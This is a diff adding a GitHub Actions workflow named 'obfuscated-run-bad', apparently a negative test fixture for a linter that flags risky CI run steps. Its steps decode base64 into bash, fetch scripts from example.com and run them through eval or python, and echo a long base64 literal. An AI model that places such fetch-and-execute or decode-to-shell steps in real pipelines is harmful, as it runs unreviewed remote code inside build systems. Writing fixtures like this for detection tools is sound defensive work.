@@ -1,0 +1,24 @@
+name: obfuscated-run-bad
+on: [push]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: base64-decode-pipe-shell
+        run: echo "aGVsbG8=" | base64 -d | bash
+
+      - name: eval-curl
+        run: eval $(curl https://example.com/script.sh)
+
+      - name: curl-pipe-python
+        run: curl https://example.com/setup.py | python
+
+      - name: long-base64-literal
+        run: |
+          PAYLOAD=aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdGhhdCBleGNlZWRzIHR3byBodW5kcmVkIGNoYXJhY3RlcnMgYW5kIG1pZ2h0IGJlIG9iZnVzY2F0ZWQgY29kZSBoZXJl
+          echo "$PAYLOAD"
